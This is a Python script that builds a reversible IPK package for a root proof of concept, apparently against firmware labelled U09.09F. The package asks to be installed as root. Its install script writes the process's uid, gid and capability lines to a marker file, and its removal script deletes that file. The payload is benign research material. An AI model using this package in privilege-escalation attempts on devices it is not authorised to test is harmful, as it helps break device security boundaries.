#!/usr/bin/env python3
"""Build the deterministic, reversible IPK used by the U09.09F root PoC.

The package does not open a port, install persistence, change the firewall,
or touch a read-only partition. Its postinst records only the effective
process credentials and capability masks; its postrm removes that record.
"""

from __future__ import annotations

import argparse
import gzip
import io
from pathlib import Path
import tarfile


PACKAGE = "re.rootprobe"

CONTROL = f"""Package: {PACKAGE}
Version: 1.0.0
Architecture: all
AppId: {PACKAGE}
AppName: {PACKAGE}
Section: ns
Priority: optional
Maintainer: alvidaa research
Description: reversible superwatch privilege-boundary probe
Format: 1
Persistent: false
PackageType: Entry
Userid: 0:0
Installed-Size: 1
"""

POSTINST = r"""#!/bin/sh
set -eu
D=/APPS/.re_root_probe
P="$D/PROOF"
mkdir -p "$D"
umask 022
{
  echo ROOT_PROBE_V1
  echo "pid=$$ ppid=$PPID"
  while IFS= read -r line; do
    case "$line" in
      Uid:*|Gid:*|Groups:*|CapEff:*|CapBnd:*|NoNewPrivs:*) echo "$line" ;;
    esac
  done < /proc/self/status
} > "$P"
chmod 0644 "$P"
exit 0
"""

POSTRM = r"""#!/bin/sh
set -eu
D=/APPS/.re_root_probe
rm -f "$D/PROOF"
rmdir "$D" 2>/dev/null || true
exit 0
"""


def add_bytes(
    archive: tarfile.TarFile,
    name: str,
    payload: bytes,
    mode: int = 0o644,
) -> None:
    info = tarfile.TarInfo(name)
    info.size = len(payload)
    info.mode = mode
    info.uid = 0
    info.gid = 0
    info.uname = ""
    info.gname = ""
    info.mtime = 0
    archive.addfile(info, io.BytesIO(payload))


def tar_gz(members: list[tuple[str, bytes, int]]) -> bytes:
    raw_tar = io.BytesIO()
    with tarfile.open(fileobj=raw_tar, mode="w", format=tarfile.GNU_FORMAT) as archive:
        for name, payload, mode in members:
            add_bytes(archive, name, payload, mode)

    output = io.BytesIO()
    with gzip.GzipFile(filename="", mode="wb", fileobj=output, mtime=0) as stream:
        stream.write(raw_tar.getvalue())
    return output.getvalue()


def ar_member(name: str, payload: bytes) -> bytes:
    encoded_name = (name + "/").encode("ascii")
    if len(encoded_name) > 16:
        raise ValueError(f"ar member name too long: {name}")
    header = (
        encoded_name.ljust(16, b" ")
        + b"0".ljust(12, b" ")
        + b"0".ljust(6, b" ")
        + b"0".ljust(6, b" ")
        + b"100644".ljust(8, b" ")
        + str(len(payload)).encode("ascii").ljust(10, b" ")
        + b"`\n"
    )
    padding = b"\n" if len(payload) % 2 else b""
    return header + payload + padding


def build() -> bytes:
    control = tar_gz(
        [
            ("./control", CONTROL.encode("utf-8"), 0o644),
            ("./postinst", POSTINST.encode("utf-8"), 0o755),
            ("./postrm", POSTRM.encode("utf-8"), 0o755),
        ]
    )
    data = tar_gz(
        [("./re.rootprobe.marker", b"reversible root probe package\n", 0o644)]
    )
    members = [
        ("debian-binary", b"2.0\n"),
        ("control.tar.gz", control),
        ("data.tar.gz", data),
    ]
    return b"!<arch>\n" + b"".join(ar_member(name, payload) for name, payload in members)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("output", type=Path)
    args = parser.parse_args()
    args.output.write_bytes(build())
    print(f"wrote {args.output} ({args.output.stat().st_size} bytes)")


if __name__ == "__main__":
    main()
